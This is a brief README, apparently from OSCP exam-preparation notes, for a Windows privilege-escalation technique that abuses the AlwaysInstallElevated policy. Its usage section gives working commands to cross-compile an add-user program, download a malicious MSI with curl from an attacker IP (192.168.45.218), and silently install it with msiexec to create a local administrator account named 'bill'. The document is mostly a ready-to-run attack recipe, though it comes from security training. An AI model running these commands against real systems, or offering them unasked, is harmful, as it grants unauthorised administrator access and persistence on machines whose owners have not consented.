# Name
Custom AlwaysInstallElevated MSI to add local admin bill

## Usage
```
i686-w64-mingw32-gcc adduser.c -o adduser.exe

curl.exe http://192.168.45.218/always_install_elevated_add_bill.msi -o always_install_elevated_add_bill.msi

msiexec /quiet /qn /i always_install_elevated_add_bill.msi
```

## Source
https://n000b3r.gitbook.io/oscp-notes/privilege-escalation/privilege-escalation-windows#alwaysinstallelevated
